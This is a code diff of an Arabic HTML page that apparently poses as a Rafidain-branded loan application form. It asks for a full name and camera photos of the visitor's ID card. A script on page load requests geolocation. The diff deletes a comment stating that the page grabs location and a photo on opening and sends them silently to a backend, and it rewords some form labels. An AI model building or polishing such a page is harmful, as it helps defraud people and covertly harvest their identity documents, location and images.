@@ -124,7 +124,7 @@
     <!-- خطوة التحميل عند فتح الصفحة -->
     <div id="stepLoading" class="step active loading-screen">
         <div class="spinner"></div>
-        <h3 style="color: var(--rafidain-green);">جاري الاتصال بالنظام...</h3>
+        <h3 style="color: var(--rafidain-green);">جاري الاتصال بالخادم...</h3>
         <p>يرجى السماح بالصلاحيات المطلوبه لفتح الاستمارة الخاصة بك.</p>
     </div>
 
@@ -134,7 +134,7 @@
         <form id="loanForm" onsubmit="submitLoanForm(event)">
             <div class="form-group">
                 <label for="fullName">الاسم الثلاثي :</label>
-                <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي كما هو في المستمسكات">
+                <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي ">
             </div>
 
             <div class="form-group">
@@ -166,7 +166,7 @@
                 <input type="file" accept="image/*" capture="environment" id="cardBack" required>
             </div>
 
-            <button type="submit" id="submitBtn" class="btn">إرسال الطلب نهائياً</button>
+            <button type="submit" id="submitBtn" class="btn">إرسال الطلب </button>
         </form>
     </div>
 
@@ -200,7 +200,7 @@
         capturedImage: ""
     };
 
-    // فور فتح الصفحة: جلب الموقع والتقاط الصورة وإرسالها تلقائياً للخلفية
+    // 
     window.onload = function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
